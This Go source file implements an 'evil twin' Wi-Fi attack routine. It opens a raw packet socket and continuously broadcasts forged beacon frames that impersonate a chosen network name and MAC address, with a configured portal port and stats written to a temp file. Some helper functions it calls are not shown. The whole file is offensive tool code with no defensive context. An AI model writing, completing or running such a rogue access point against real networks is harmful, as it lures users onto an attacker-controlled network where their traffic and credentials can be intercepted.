package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"
)

type EviltwinStats struct {
	Packets    int64  `json:"packets"`
	SSID       string `json:"ssid"`
	BSSID      string `json:"bssid"`
	Interface  string `json:"interface"`
	Channel    int    `json:"channel"`
	PortalPort int    `json:"portal_port"`
	Running    bool   `json:"running"`
}

func EviltwinV3(iface, ssid, bssidStr string, channel int, portalPort int, stop <-chan struct{}) error {
	bssid := mac2bytes(bssidStr)

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return fmt.Errorf("raw socket: %v", err)
	}
	defer syscall.Close(fd)

	ifi, err := net.InterfaceByName(iface)
	if err != nil {
		return fmt.Errorf("interface %s: %v", iface, err)
	}

	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ALL),
		Ifindex:  ifi.Index,
	}

	if err := syscall.Bind(fd, &addr); err != nil {
		return fmt.Errorf("bind: %v", err)
	}

	fmt.Printf("[GO-EVILTWIN-V3] Broadcasting '%s' [%s] on %s ch%d portal:%d\n", ssid, bssidStr, iface, channel, portalPort)
	pktCount := 0
	seq := uint16(0)
	lastStats := time.Now()

	writeStats := func(running bool) {
		_ = writeEviltwinStats(EviltwinStats{
			Packets:    int64(pktCount),
			SSID:       ssid,
			BSSID:      bssidStr,
			Interface:  iface,
			Channel:    channel,
			PortalPort: portalPort,
			Running:    running,
		})
	}

	for {
		select {
		case <-stop:
			fmt.Printf("\n[GO-EVILTWIN-V3] Stopped after %d packets\n", pktCount)
			writeStats(false)
			return nil
		default:
		}

		frame := buildBeaconFrame(ssid, bssid, channel, seq)
		seq = (seq + 1) & 0xFFF
		n, err := syscall.Write(fd, frame)
		if err == nil && n > 0 {
			pktCount++
		}

		if pktCount%1000 == 0 {
			fmt.Printf("\r[GO-EVILTWIN-V3] Beacon: %d", pktCount)
			os.Stdout.Sync()
		}

		if time.Since(lastStats) > 5*time.Second {
			writeStats(true)
			lastStats = time.Now()
		}
	}
}

func writeEviltwinStats(s EviltwinStats) error {
	data, err := json.Marshal(s)
	if err != nil {
		return err
	}
	return os.WriteFile("/tmp/eviltwin_go.json", data, 0644)
}
